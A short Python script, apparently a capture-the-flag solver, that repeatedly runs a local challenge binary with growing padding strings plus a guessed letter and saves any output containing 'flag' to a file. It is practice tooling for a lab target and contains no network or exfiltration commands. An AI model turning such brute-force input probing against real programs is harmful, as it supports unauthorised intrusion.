import subprocess
import binascii
import string

#amount of letters tried
loops = int(input("amount of loops: "))

#attacked program
program_path = "modern3.exe"


#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaz\


#defined global inputs
user_inputs2 = ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaz"]
user_inputs = "a"

# global to see if the flag is found
checker = "ng"

def execute_program(input_string):
    cmd = [program_path]
    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    process.stdin.write(input_string.encode())
    process.stdin.flush()    
    process.wait()    
    output = process.stdout.read().decode()
    
    #looking for a flag
    if "flag" in output:
        global checker
        
        print("gevonden! ")
        f = open("FlagFile.txt","w")
        f.write(output)
        f.close
        checker = "g"
        #print(checker) #for debugging
    return output 
       
def execute_with_output(input_string):
    print("input: ", input_string)
    output = execute_program(input_string)
    print("Output: \n----------------------\n") 
    print(output)
    print("----------------------\n")
    
for i in range(loops):
    #padding
    for input_string in user_inputs:  
        #value lettern
        for letter in string.ascii_lowercase:
            #if the flag is not found
            if checker == "ng":
                print("------ loop ",i," ------\n")
                execute_with_output(input_string * i + letter)
            #if the flag is found
            if checker == "g":
                print("--- Information ---")
                print("loops:  ", i," * ", user_inputs)
                print("letter: ", letter)
                checker = "done"
                i = loops
                print("\nflag output can be found in FlagFile.txt")
                break
